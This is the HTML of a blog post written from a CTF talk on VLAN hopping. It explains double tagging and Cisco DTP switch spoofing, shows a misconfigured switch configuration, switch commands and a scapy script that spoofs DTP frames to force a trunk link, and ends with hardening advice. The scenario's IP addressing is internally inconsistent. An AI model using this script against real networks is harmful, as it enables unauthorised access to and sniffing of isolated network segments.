<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Networking - VLAN Hopping | bWlrYQ | Blog</title><meta name=keywords content="Networking,Security,Layer 2,VLAN,Explotation"><meta name=description content="Blogpost about VLAN Hopping and techniques to exploit this vulnerability."><meta name=author content="bWlrYQ"><link rel=canonical href=https://bwlryq.net/posts/vlan_hopping/><link crossorigin=anonymous href=/assets/css/stylesheet.abc7c82c3d415a6df50430738d1cbcc4c76fea558bc5a0c830d3babf78167a35.css integrity="sha256-q8fILD1BWm31BDBzjRy8xMdv6lWLxaDIMNO6v3gWejU=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad();></script><link rel=icon href=https://bwlryq.net/img/pfp.png><link rel=icon type=image/png sizes=16x16 href=https://bwlryq.net/img/pfp.png><link rel=icon type=image/png sizes=32x32 href=https://bwlryq.net/img/pfp.png><link rel=apple-touch-icon href=https://bwlryq.net/img/pfp.png><link rel=mask-icon href=https://bwlryq.net/img/pfp.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://bwlryq.net/posts/vlan_hopping/><link rel=alternate hreflang=fr href=https://bwlryq.net/fr/posts/vlan_hopping/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:title" content="Networking - VLAN Hopping"><meta property="og:description" content="Blogpost about VLAN Hopping and techniques to exploit this vulnerability."><meta property="og:type" content="article"><meta property="og:url" content="https://bwlryq.net/posts/vlan_hopping/"><meta property="og:image" content="https://bwlryq.net/img/pfp.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-11-22T00:00:00+00:00"><meta property="article:modified_time" content="2022-11-22T00:00:00+00:00"><meta property="og:site_name" content="bWlrYQ | Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://bwlryq.net/img/pfp.png"><meta name=twitter:title content="Networking - VLAN Hopping"><meta name=twitter:description content="Blogpost about VLAN Hopping and techniques to exploit this vulnerability."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://bwlryq.net/posts/"},{"@type":"ListItem","position":3,"name":"Networking - VLAN Hopping","item":"https://bwlryq.net/posts/vlan_hopping/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Networking - VLAN Hopping","name":"Networking - VLAN Hopping","description":"Blogpost about VLAN Hopping and techniques to exploit this vulnerability.","keywords":["Networking","Security","Layer 2","VLAN","Explotation"],"articleBody":"Introduction During Flag‚ÄôMalo #6 the yearly CTF organized by my university department, I gave a quick talk on VLAN Hopping techniques. This vulnerability is a well known layer 2 exploit that can be used to sniff the network traffic from other VLAN‚Äôs and access hosts that are on a different VLAN than the one the attacker is originally in.\nThe slides (in French) from the talk can be found on my GitHub by clicking here.\nThis post is made for educational purpose only, for legal reasons you are not allowed to reproduce any of these VLAN hopping techniques on a network except if you have received the explicit written permission of the owner. However you can still train by building a virtual network using GNS3 (or other).\nVLANs - Quick Reminder  Disclaimer: these few paragraphs are not a course or a lesson about VLANs, I highly recommend following a real one before trying to exploit anything linked to VLANs, it‚Äôll allow you to understand way better any concept linked to this technology.\n VLANS - Introduction First of all, for those of you reading this post that wouldn‚Äôt know about VLANs let‚Äôs take a quick look at what they are. If ever you do already master everything you need to know related to VLANs and how they work, you can directly jump to VLAN Hopping - Techniques.\nSo, what are VLANs ? By definition (Wikipedia):\n ‚ÄúA virtual local area network (VLAN) is any broadcast domain that is partitioned and isolated in a computer network at the data link layer (OSI layer 2). In this context, virtual, refers to a physical object recreated and altered by additional logic, within the local area network. VLANs work by applying tags to network frames and handling these tags in networking systems ‚Äì creating the appearance and functionality of network traffic that is physically on a single network but acts as if it is split between separate networks. In this way, VLANs can keep network applications separate despite being connected to the same physical network, and without requiring multiple sets of cabling and networking devices to be deployed.‚Äù\n This definition is not really easy to get around with so let‚Äôs try and simplify things. Let‚Äôs imagine I‚Äôm a sysadmin, working for a small company and for security reasons I do not want HR‚Äôs to be able to be on the same network as the secretary team, nor the accountability team etc‚Ä¶ I can put them all on different LAN‚Äôs (192.168.1.0/24, 192.168.2.0/24 ‚Ä¶) and then forward of all these networks to my company‚Äôs router. This solution is functional but it asks way too much switches and it complexifies the network infrastructure. Basically using this solution would make my network look like that:\nThis isn‚Äôt conceivable. VLAN‚Äôs allow us to segment an defined network into different LANs isolated from each other. Each VLAN will have an associated number (eg VLAN 100, VLAN 200 etc‚Ä¶). This layer 2 ((Wikipedia)[https://en.wikipedia.org/wiki/Data_link_layer]) technology will permit us to have the security and the isolation aspect while reducing the number of switches and the physical complexity of the infrastructure. Using VLANs, the network I talked about just before would look like this:\nTo sum up VLANs have multiple advantages, they:\n Reduce network infrastructure costs Improve physical infrastructure topology Reinforce the security aspect  VLANs - Modes For now there is a problem with what we‚Äôve said about VLANs, we can easily guess all the employees aren‚Äôt working in the same room so what happens if they are not. How can we make a VLAN go from a switch to an other ? We could have one link per VLAN between two switches but that would go against the concept of improving the network infrastructure, it would be a lot of cables for nothing and use up a lot of ports on our switches.\nWe can now introduce ‚Äúmodes‚Äù there are two modes for a port when we are using vlans, either the access mode or the trunk mode. An access port is a port that will only let one specific vlan pass, it‚Äôs the ‚Äúdefault‚Äù mode when you plug-in a host to a switch (if VLANs are enabled). The second mode called trunk allows you to pass multiple VLANs on one link. This trunk mode is only meant to be used between two switches.\nLet‚Äôs take our previous diagram, imagine that our employees our splitted in two different open spaces and adapt it with a trunk link:\nNow that we know about the basics we can jump to the theory about how to exploit VLANs.\nVLAN Hopping - Techniques By default VLANs aren‚Äôt unsecure, the vulnerabilities linked to VLANs are due to misconfigurations. For this post i‚Äôll introduce two different methods that could allow you to attack a network that has been secures using VLANs.\nMethod 1: Double Tagging The first method I‚Äôm going to talk about is Double Tagging, as I said every VLAN has an assigned number. In order to transmit ethernet frames accross the network, switches mark those frames with what we call a ‚Äútag‚Äù. So each frame has a tag that contains the number of the VLAN.\nWe all know networking works on a layer basis with an encapsulation/decapsulation process. When a switch receives a packet from a host it adds a vlan tag but before sending it back to the destination host it‚Äôll take off the tag. So what happens if we craft our own packet and tag it with the VLAN number we want ?\nWell it will not work just like that as I said VLANs are by default secure, we need some particular conditions. By default even if there aren‚Äôt any specific VLANs there still is one active VLAN, what we call the ‚Äúnative vlan‚Äù and it‚Äôs number is one. By default this VLAN is not tagged because it‚Äôs the default VLAN. So if a switch receives a frame tagged with the default VLAN it‚Äôll take it off before sending it back to an other switch.\nCan you spot the problem üò≤ ? In a network configuration when we go through at least two switches and we are plugged to a port that is in the default VLAN we can craft a malicious packet with two consecutive tags. The first one will be the default VLAN (eg 1 or an other) and the second the VLAN we are trying to access.\nThe following diagram illustrates the vulnerability:\nThis attack is really easy to set up but it has a big flaw, you can‚Äôt receive any traffic from an other VLAN, you can only send packets to an other host on an other VLAN.\nMethod 2: Switch Spoofing The second method is way more interesting than the first one because it allows you to act just as if you were in the VLAN you are attacking, it‚Äôs not limited like the precedent method. Yet there is still an important factor that needs to be taken into account, it is specific to Cisco switches (widespread equipments so not a real problem).\nFirst, let‚Äôs bash Cisco a bit !\nNow we can introduce DTP, the Dynamic Trunking Protocol developed by Cisco for Cisco systems. This protocol aims to allow switches to negotiate automatically the establishment of a trunk link between switches. By default DTP is active, you need to deactive it if you want to freeze a port on access mode.\nThere are two DTP modes for a port, dynamic auto or dynamic desirable. In auto mode the switch is actively listening for a DTP frame in order to negotiate and set up a trunk link. In desirable mode the switch is actively sending DTP frames to tell a switch ‚Äúhey hello, I‚Äôm waiting for a trunk to bet established‚Äù.\nWe can look at how a trunk link is established between two hosts when we plug a host to a switch that is willing to set up a trink with this diagram:\nOnce our trunk is established, we can communicate to any VLAN of the network.\nSimple Attack Scenario Theory is cool but now let‚Äôs practice ! We can imagine a small scenario with a simple company network where we are in a VLAN and want to hop to an other one. Here it is (simplified):\nSo, PC1 is in VLAN 100 with the IP address 192.168.100.1/24 and PC2‚Äôs IP address is 192.168.100.254/24 in VLAN 200. The configuration of the switch is the following (some useless parts have been snipped):\nversion 15.0 ! hostname switch_entreprise ! interface GigabitEthernet0/1 description **Machine VLAN 100** switchport access vlan 100 switchport mode access ! interface GigabitEthernet0/2 description **Vlan 100 access, trunk dynamic desirable** switchport trunk encapsulation dot1q switchport trunk native vlan 100 switchport mode dynamic desirable ! ! SAME FOR Gi0/3 - Gi0/6 ! interface GigabitEthernet0/7 description **Vlan 100 access, trunk dynamic desirable** switchport trunk encapsulation dot1q switchport trunk native vlan 100 switchport mode dynamic desirable ! interface GigabitEthernet0/8 description **Machine VLAN 200** switchport access vlan 200 switchport mode access ! interface GigabitEthernet0/9 description **Shut** shutdown ! interface GigabitEthernet0/10 description **Shut** shutdown ! interface Vlan1 ip address 192.168.100.1 255.255.255.0 shutdown ! interface Vlan100 ip address 192.168.100.1 255.255.255.0 ! interface Vlan200 no ip address We can see that the ports Gi0/2 to Gi0/7 are in VLAN 100 but DTP isn‚Äôt deactivated. This means that if we link a host that isn‚Äôt a Cisco switch then it‚Äôll be in VLAN 100 on an access port. However, if ever we manage to connect a Cisco switch and establish a trunk link using DTP then we‚Äôll be able to hop into any VLAN.\nProof Of Concept Time to exploit ! Let‚Äôs say the ports Gi0/2 to Gi0/7 are all connected to different rooms of the company for employees to plug to in order to get access to Internet and work. The usage is legitimate so we will not encounter any problem.\nMethod 1 If ever I bring my own switch and plug it to the network, just like this:\nFirst let‚Äôs grab our IP:\nTry and ping PC1 and the IP of VLAN 100‚Äôs interface:\nAnd now ping PC2 (in VLAN200):\nWithout any surprise, we can‚Äôt ping PC2 but let‚Äôs fix that ! On our attacker switch we can see that a trunk link has been established automatically:\nWe just need to put our attacker host in VLAN 200 using this set of commands:\nconf t int Gi0/8 switchport mode access switchport access vlan 200 exit int Gi0/1 switchport trunk native vlan 100 end And now ping PC2:\nIt‚Äôs a success ! We‚Äôve hopped from a VLAN to an other without modifying the actual network state.\nMethod 2 Let‚Äôs say I‚Äôm really unlucky and have forgotten my super Cisco switch home. That‚Äôs not a problem, we just need to craft our DTP packet on our own. The network will look like this:\nWe can connect directly our attacker laptop. Take a glance at the trunk on the company switch:\nThere is no sign of a trunk link, but remember, our ports are on Dynamic Desirable mode this means the switch is actively looking to set up a trunk link and seding DTP frames. We can create this simple python script:\n#Imports from scapy.all import * load_contrib('dtp') #Var trunk_init = False mac_addr = \"00:1b:21:a5:ac:36\" interface = \"eth0\" while not trunk_init: #Listen for DTP frames print(\"[~] Listening for DTP packet...\") pkt = sniff(count=1, iface=interface, filter=\"ether dst 01:00:0c:cc:cc:cc\") print(\"[~] Found DTP packet\") #Craft malicious packet pkt[0].src=mac_addr pkt[0][DTP][DTPStatus].status='\\x03' #Trunk initialization  print(\"[!] Intiating trunk...\") try: sendp(pkt[0], loop=0, verbose=1, iface=interface) print(\"[!] Trunk initiated\") trunk_init=True except: print(\"[!] Failed intiating trunk\") This script is sniffing on a specified interface for a DTP frame, once it has sniffed it we can replace the MAC source address by ours, change the status to \\x03 that sets it to desirable. Then send back the packet, right after we can see the link goes down and up after half a second.\nHere is the execution of our script:\nWe can now check the trunk status on the company switch:\nAnd we can see the link between the switch and our laptop is now trunk and not an access one. This means we can sniff the traffic coming from others VLANs and even craft our own packets with a specified VLAN tag. In order to verify what I‚Äôve just said let‚Äôs just wait for an ARP request from PC2:\nAnd that‚Äôs how we can confirm ou PoC (yes I‚Äôm too lazy to craft my own tagged packets) ! Just for the fun I opened a web server on my attacker host and requested it from PC2, here it is:\nMitigations Okey, we‚Äôve been able to exploit VLAN Hopping, but now, how can we avoid getting hopped on our own network and limit the use of VLAN Hopping ? These are a few mitigations that can be applied to switches (I‚Äôll give the commands for Cisco switches but you can look for the equivalent for other systems).\nMitigate Double Tagging Double tagging is quite hard to mitigate but you can still drastically limit it by:\n Changing native VLAN  switchport trunk native vlan [vlan number]   Deactivating any protocol that could give information about native VLAN (eg CDP for Cisco)  no cdp run   Force tagging of native VLAN  vlan dot1q tag native    Mitigate Switch Spoofing You can mitigate Switch Spoofing by:\n Deactivating DTP on every port  switchport nonegotiate   Always put ports that are not absolutely needed for a trunk in access mode  switchport mode access   Using the same reccomandations than the ones for Double Tagging  Conclusion In order to conclude this blogpost I would like first of all to thank you for reading until here, if ever you feel this article taught you anything, feel free to share it to friends and on any social network.\nIf ever you think there are some precisions/fixes that should be applied to this post hit me up on socials, Twitter here or on Discord \\`#0001.\nWhat‚Äôs more, big thanks to Flag‚ÄôMalo for offering me the possibility of giving my first ever talk !\nAnd as I only taunted Cisco two times during this post I would like to do it for a third time :) ","wordCount":"2358","inLanguage":"en","datePublished":"2022-11-22T00:00:00Z","dateModified":"2022-11-22T00:00:00Z","author":{"@type":"Person","name":"bWlrYQ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://bwlryq.net/posts/vlan_hopping/"},"publisher":{"@type":"Organization","name":"bWlrYQ | Blog","logo":{"@type":"ImageObject","url":"https://bwlryq.net/img/pfp.png"}}}</script></head><body class=dark id=top><script>if(localStorage.getItem("pref-theme")==="light"){document.body.classList.remove('dark')}</script><header class=header><nav class=nav><div class=logo><a href=https://bwlryq.net accesskey=h title="Home (Alt + H)"><img src=https://bwlryq.net/img/pfp.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li><li><a href=https://bwlryq.net/fr/ title=French aria-label=:fr:>üá´üá∑</a></li></ul></div></div><ul id=menu><li><a href=https://bwlryq.net/whoami/ title=Whoami><span>Whoami</span></a></li><li><a href=https://bwlryq.net/posts/ title=Posts><span>Posts</span></a></li><li><a href=https://bwlryq.net/cheatsheets/ title=Cheatsheets><span>Cheatsheets</span></a></li><li><a href=https://bwlryq.net/search/ title=Search><span>Search</span></a></li><li><a href=https://bwlryq.net/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://root-me.org/bWlrYQ title="Root-Me Profile"><span>Root-Me Profile</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://bwlryq.net>Home</a>&nbsp;¬ª&nbsp;<a href=https://bwlryq.net/posts/>Posts</a></div><h1 class=post-title>Networking - VLAN Hopping</h1><div class=post-meta><span title="2022-11-22 00:00:00 +0000 UTC">November 22, 2022</span>&nbsp;¬∑&nbsp;12 min&nbsp;¬∑&nbsp;2358 words&nbsp;¬∑&nbsp;bWlrYQ&nbsp;|&nbsp;Translations:<ul class=i18n_list><li><a href=https://bwlryq.net/fr/posts/vlan_hopping/>üá´üá∑</a></li></ul></div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#vlans---quick-reminder>VLANs - Quick Reminder</a><ul><li><a href=#vlans---introduction>VLANS - Introduction</a></li><li><a href=#vlans---modes>VLANs - Modes</a></li></ul></li><li><a href=#vlan-hopping---techniques>VLAN Hopping - Techniques</a><ul><li><a href=#method-1-double-tagging>Method 1: Double Tagging</a></li><li><a href=#method-2-switch-spoofing>Method 2: Switch Spoofing</a></li></ul></li><li><a href=#simple-attack-scenario>Simple Attack Scenario</a></li><li><a href=#proof-of-concept>Proof Of Concept</a><ul><li><a href=#method-1>Method 1</a></li><li><a href=#method-2>Method 2</a></li></ul></li><li><a href=#mitigations>Mitigations</a><ul><li><a href=#mitigate-double-tagging>Mitigate Double Tagging</a></li><li><a href=#mitigate-switch-spoofing>Mitigate Switch Spoofing</a></li></ul></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></div></details></div><div class=post-content><h2 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2><p>During <a href=https://flagmalo.fr/><strong>Flag&rsquo;Malo #6</strong></a> the yearly CTF organized by my university department, I gave a quick talk on VLAN Hopping techniques. This vulnerability is a well known layer 2 exploit that can be used to sniff the network traffic from other VLAN&rsquo;s and access hosts that are on a different VLAN than the one the attacker is originally in.</p><p>The slides (in French) from the talk can be found on my GitHub by clicking <a href=https://github.com/bWlrYQ/vlan_hopping/>here</a>.</p><p>This post is made for educational purpose only, for legal reasons you are not allowed to reproduce any of these VLAN hopping techniques on a network except if you have received the explicit written permission of the owner. However you can still train by building a virtual network using <a href=https://www.gns3.com/>GNS3</a> (or other).</p><h2 id=vlans---quick-reminder>VLANs - Quick Reminder<a hidden class=anchor aria-hidden=true href=#vlans---quick-reminder>#</a></h2><blockquote><p>Disclaimer: these few paragraphs <strong>are not</strong> a course or a lesson about VLANs, I highly recommend following a real one before trying to exploit anything linked to VLANs, it&rsquo;ll allow you to understand way better any concept linked to this technology.</p></blockquote><h3 id=vlans---introduction>VLANS - Introduction<a hidden class=anchor aria-hidden=true href=#vlans---introduction>#</a></h3><p>First of all, for those of you reading this post that wouldn&rsquo;t know about VLANs let&rsquo;s take a quick look at what they are. If ever you do already master everything you need to know related to VLANs and how they work, you can directly jump to <a href=#vlan-hopping---techniques>VLAN Hopping - Techniques</a>.</p><p>So, what are VLANs ? By definition (<a href=https://en.wikipedia.org/wiki/VLAN>Wikipedia</a>):</p><blockquote><p>&ldquo;A virtual local area network (VLAN) is any broadcast domain that is partitioned and isolated in a computer network at the data link layer (OSI layer 2). In this context, virtual, refers to a physical object recreated and altered by additional logic, within the local area network. VLANs work by applying tags to network frames and handling these tags in networking systems ‚Äì creating the appearance and functionality of network traffic that is physically on a single network but acts as if it is split between separate networks. In this way, VLANs can keep network applications separate despite being connected to the same physical network, and without requiring multiple sets of cabling and networking devices to be deployed.&rdquo;</p></blockquote><p>This definition is not really easy to get around with so let&rsquo;s try and simplify things. Let&rsquo;s imagine I&rsquo;m a sysadmin, working for a small company and for security reasons I do not want HR&rsquo;s to be able to be on the same network as the secretary team, nor the accountability team etc&mldr; I can put them all on different LAN&rsquo;s (192.168.1.0/24, 192.168.2.0/24 &mldr;) and then forward of all these networks to my company&rsquo;s router. This solution is functional but it asks way too much switches and it complexifies the network infrastructure. Basically using this solution would make my network look like that:<br><img loading=lazy src=/img/posts/vlan_hopping/schema_reseau_sans_vlan.svg alt=network_without_vlan></p><p>This isn&rsquo;t conceivable. VLAN&rsquo;s allow us to segment an defined network into different LANs isolated from each other. Each VLAN will have an associated number (eg VLAN 100, VLAN 200 etc&mldr;). This layer 2 ((Wikipedia)[https://en.wikipedia.org/wiki/Data_link_layer]) technology will permit us to have the security and the isolation aspect while reducing the number of switches and the physical complexity of the infrastructure. Using VLANs, the network I talked about just before would look like this:<br><img loading=lazy src=/img/posts/vlan_hopping/reseau_avec_vlan.svg alt=network_with_vlans></p><p>To sum up VLANs have multiple advantages, they:</p><ul><li>Reduce network infrastructure costs</li><li>Improve physical infrastructure topology</li><li>Reinforce the security aspect</li></ul><h3 id=vlans---modes>VLANs - Modes<a hidden class=anchor aria-hidden=true href=#vlans---modes>#</a></h3><p>For now there is a problem with what we&rsquo;ve said about VLANs, we can easily guess all the employees aren&rsquo;t working in the same room so what happens if they are not. How can we make a VLAN go from a switch to an other ? We could have one link per VLAN between two switches but that would go against the concept of improving the network infrastructure, it would be a lot of cables for nothing and use up a lot of ports on our switches.</p><p>We can now introduce &ldquo;<strong>modes</strong>&rdquo; there are two modes for a port when we are using vlans, either the <strong>access mode</strong> or the <strong>trunk mode</strong>. An access port is a port that will only let one specific vlan pass, it&rsquo;s the &ldquo;default&rdquo; mode when you plug-in a host to a switch (if VLANs are enabled). The second mode called trunk allows you to pass multiple VLANs on one link. This trunk mode is only meant to be used between two switches.</p><p>Let&rsquo;s take our previous diagram, imagine that our employees our splitted in two different open spaces and adapt it with a trunk link:<br><img loading=lazy src=/img/posts/vlan_hopping/schema_vlan_avec_trunk.svg alt=network_with_vlan_and_trunk></p><p>Now that we know about the basics we can jump to the theory about how to exploit VLANs.</p><h2 id=vlan-hopping---techniques>VLAN Hopping - Techniques<a hidden class=anchor aria-hidden=true href=#vlan-hopping---techniques>#</a></h2><p>By default VLANs aren&rsquo;t unsecure, the vulnerabilities linked to VLANs are due to misconfigurations. For this post i&rsquo;ll introduce two different methods that could allow you to attack a network that has been secures using VLANs.<br><img loading=lazy src=/img/posts/vlan_hopping/bugs_bunny.jpg alt=meme_vlans_sysadmin></p><h3 id=method-1-double-tagging>Method 1: Double Tagging<a hidden class=anchor aria-hidden=true href=#method-1-double-tagging>#</a></h3><p>The first method I&rsquo;m going to talk about is <strong>Double Tagging</strong>, as I said every VLAN has an assigned number. In order to transmit ethernet frames accross the network, switches mark those frames with what we call a &ldquo;tag&rdquo;. So each frame has a tag that contains the number of the VLAN.</p><p>We all know networking works on a layer basis with an encapsulation/decapsulation process. When a switch receives a packet from a host it adds a vlan tag but before sending it back to the destination host it&rsquo;ll take off the tag. So what happens if we craft our own packet and tag it with the VLAN number we want ?</p><p>Well it will not work just like that as I said VLANs are by default secure, we need some particular conditions. By default even if there aren&rsquo;t any specific VLANs there still is one active VLAN, what we call the &ldquo;native vlan&rdquo; and it&rsquo;s number is one. By default this VLAN is not tagged because it&rsquo;s the default VLAN. So if a switch receives a frame tagged with the default VLAN it&rsquo;ll take it off before sending it back to an other switch.</p><p>Can you spot the problem üò≤ ? In a network configuration when we go through at least two switches and we are plugged to a port that is in the default VLAN we can craft a malicious packet with two consecutive tags. The first one will be the default VLAN (eg 1 or an other) and the second the VLAN we are trying to access.</p><p>The following diagram illustrates the vulnerability:<br><img loading=lazy src=/img/posts/vlan_hopping/schema_double_tagging.svg alt=double_tagging_schema></p><p>This attack is really easy to set up but it has a big flaw, you can&rsquo;t receive any traffic from an other VLAN, you can only send packets to an other host on an other VLAN.</p><h3 id=method-2-switch-spoofing>Method 2: Switch Spoofing<a hidden class=anchor aria-hidden=true href=#method-2-switch-spoofing>#</a></h3><p>The second method is way more interesting than the first one because it allows you to act just as if you were in the VLAN you are attacking, it&rsquo;s not limited like the precedent method. Yet there is still an important factor that needs to be taken into account, it is specific to Cisco switches (widespread equipments so not a real problem).</p><p>First, let&rsquo;s bash Cisco a bit !<br><img loading=lazy src=/img/posts/vlan_hopping/gru.jpg alt=double_tagging_schema></p><p>Now we can introduce DTP, the Dynamic Trunking Protocol developed by Cisco for Cisco systems. This protocol aims to allow switches to negotiate automatically the establishment of a trunk link between switches. By default DTP is active, you need to deactive it if you want to freeze a port on access mode.</p><p>There are two DTP modes for a port, <strong>dynamic auto</strong> or <strong>dynamic desirable</strong>. In auto mode the switch is actively listening for a DTP frame in order to negotiate and set up a trunk link. In desirable mode the switch is actively sending DTP frames to tell a switch &ldquo;hey hello, I&rsquo;m waiting for a trunk to bet established&rdquo;.</p><p>We can look at how a trunk link is established between two hosts when we plug a host to a switch that is willing to set up a trink with this diagram:<br><img loading=lazy src=/img/posts/vlan_hopping/dtp_vlan_hopping.svg alt=schema_dtp_trunk></p><p>Once our trunk is established, we can communicate to any VLAN of the network.</p><h2 id=simple-attack-scenario>Simple Attack Scenario<a hidden class=anchor aria-hidden=true href=#simple-attack-scenario>#</a></h2><p>Theory is cool but now let&rsquo;s practice ! We can imagine a small scenario with a simple company network where we are in a VLAN and want to hop to an other one. Here it is (simplified):<br><img loading=lazy src=/img/posts/vlan_hopping/schema_scenario_entreprise.svg alt=schema_company></p><p>So, PC1 is in <strong>VLAN 100 with</strong> the IP address <strong>192.168.100.1/24</strong> and PC2&rsquo;s IP address is <strong>192.168.100.254/24 in VLAN 200</strong>. The configuration of the switch is the following (some useless parts have been snipped):</p><pre><code>version 15.0
!
hostname switch_entreprise
!
interface GigabitEthernet0/1
 description **Machine VLAN 100**
 switchport access vlan 100
 switchport mode access
!
interface GigabitEthernet0/2
 description **Vlan 100 access, trunk dynamic desirable**
 switchport trunk encapsulation dot1q
 switchport trunk native vlan 100
 switchport mode dynamic desirable
!
! SAME FOR Gi0/3 - Gi0/6
!
interface GigabitEthernet0/7
 description **Vlan 100 access, trunk dynamic desirable**
 switchport trunk encapsulation dot1q
 switchport trunk native vlan 100
 switchport mode dynamic desirable
!
interface GigabitEthernet0/8
 description **Machine VLAN 200**
 switchport access vlan 200
 switchport mode access
!
interface GigabitEthernet0/9
 description **Shut**
 shutdown
!
interface GigabitEthernet0/10
 description **Shut**
 shutdown
!
interface Vlan1
 ip address 192.168.100.1 255.255.255.0
 shutdown
!
interface Vlan100
 ip address 192.168.100.1 255.255.255.0
!
interface Vlan200
 no ip address
</code></pre><p>We can see that the ports Gi0/2 to Gi0/7 are in VLAN 100 but DTP isn&rsquo;t deactivated. This means that if we link a host that isn&rsquo;t a Cisco switch then it&rsquo;ll be in VLAN 100 on an access port. However, if ever we manage to connect a Cisco switch and establish a trunk link using DTP then we&rsquo;ll be able to hop into any VLAN.</p><h2 id=proof-of-concept>Proof Of Concept<a hidden class=anchor aria-hidden=true href=#proof-of-concept>#</a></h2><p>Time to exploit ! Let&rsquo;s say the ports Gi0/2 to Gi0/7 are all connected to different rooms of the company for employees to plug to in order to get access to Internet and work. The usage is legitimate so we will not encounter any problem.</p><h3 id=method-1>Method 1<a hidden class=anchor aria-hidden=true href=#method-1>#</a></h3><p>If ever I bring my own switch and plug it to the network, just like this:<br><img loading=lazy src=/img/posts/vlan_hopping/schema_attaque_avec_switch.svg alt=schema_company_with_attacker_switch></p><p>First let&rsquo;s grab our IP:<br><img loading=lazy src=/img/posts/vlan_hopping/get_ip.png alt=get_ip_attacker_host></p><p>Try and ping PC1 and the IP of VLAN 100&rsquo;s interface:<br><img loading=lazy src=/img/posts/vlan_hopping/ping_vlan100.png alt=ping_vlan100></p><p>And now ping PC2 (in VLAN200):<br><img loading=lazy src=/img/posts/vlan_hopping/ping_pc2.png alt=ping_pc2></p><p>Without any surprise, we can&rsquo;t ping PC2 but let&rsquo;s fix that ! On our attacker switch we can see that a trunk link has been established automatically:<br><img loading=lazy src=/img/posts/vlan_hopping/trunk_state_switch_attacker.png alt=trunk_state_switch_attacker></p><p>We just need to put our attacker host in VLAN 200 using this set of commands:</p><pre><code>conf t 
int Gi0/8
switchport mode access 
switchport access vlan 200
exit
int Gi0/1
switchport trunk native vlan 100
end
</code></pre><p>And now ping PC2:<br><img loading=lazy src=/img/posts/vlan_hopping/ping_pc2_success.png alt=ping_pc2_success><br>It&rsquo;s a success ! We&rsquo;ve hopped from a VLAN to an other without modifying the actual network state.<br><img loading=lazy src=/img/posts/vlan_hopping/spongebob.jpg alt=spongebob></p><h3 id=method-2>Method 2<a hidden class=anchor aria-hidden=true href=#method-2>#</a></h3><p>Let&rsquo;s say I&rsquo;m really unlucky and have forgotten my super Cisco switch home. That&rsquo;s not a problem, we just need to craft our DTP packet on our own. The network will look like this:<br><img loading=lazy src=/img/posts/vlan_hopping/schema_company_with_attacker_switch.svg alt=schema_company_with_attacker_switch></p><p>We can connect directly our attacker laptop. Take a glance at the trunk on the company switch:<br><img loading=lazy src=/img/posts/vlan_hopping/trunk_company_switch.png alt=trunk_state_company></p><p>There is no sign of a trunk link, but remember, our ports are on Dynamic Desirable mode this means the switch is actively looking to set up a trunk link and seding DTP frames. We can create this simple python script:</p><div class=highlight><pre class=chroma><code class=language-py data-lang=py><span class=c1>#Imports</span>
<span class=kn>from</span> <span class=nn>scapy.all</span> <span class=kn>import</span> <span class=o>*</span>
<span class=n>load_contrib</span><span class=p>(</span><span class=s1>&#39;dtp&#39;</span><span class=p>)</span> 

<span class=c1>#Var</span>
<span class=n>trunk_init</span> <span class=o>=</span> <span class=bp>False</span>
<span class=n>mac_addr</span> <span class=o>=</span> <span class=s2>&#34;00:1b:21:a5:ac:36&#34;</span>
<span class=n>interface</span> <span class=o>=</span> <span class=s2>&#34;eth0&#34;</span>

<span class=k>while</span> <span class=ow>not</span> <span class=n>trunk_init</span><span class=p>:</span>
    <span class=c1>#Listen for DTP frames</span>
    <span class=k>print</span><span class=p>(</span><span class=s2>&#34;[~] Listening for DTP packet...&#34;</span><span class=p>)</span>
